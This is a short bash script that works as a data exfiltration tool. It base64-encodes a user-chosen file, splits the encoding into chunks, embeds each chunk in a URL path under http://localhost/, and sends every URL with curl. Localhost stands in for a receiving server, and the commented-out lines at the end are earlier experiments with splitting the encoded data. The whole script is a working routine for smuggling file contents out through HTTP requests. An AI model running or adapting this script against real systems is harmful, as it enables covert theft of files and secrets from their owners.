#!/bin/bash
#
### path to file to be sent
echo "path to file"
read path


### encoding the file
ENCODED=$(base64 $path)
echo $ENCODED > /tmp/ax0c.txt


### organizing the file
tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
FILE="/tmp/ax0d.txt"

#HITS=`cat /tmp/ax0d.txt | wc -l`
#echo $FILE


### doing same magic... preparing file to be sent...
for i in $(cat $FILE); do
        echo "http://localhost/$i" >> /tmp/ax0a.txt
done

### send the pattern 

### sed the file!
FILE2="/tmp/ax0a.txt"
echo $FILE2


for j in $(cat $FILE2); do
        curl $j
done







### old stuffs
#echo ${ENCODED:0:77}

#echo " "

#echo ${ENCODED:77:77}

#echo " " 

#echo ${ENCODED:200:100}


#NUM=$(base64 Desktop/6.jpg | wc -m)

#echo $(($NUM/100))
#
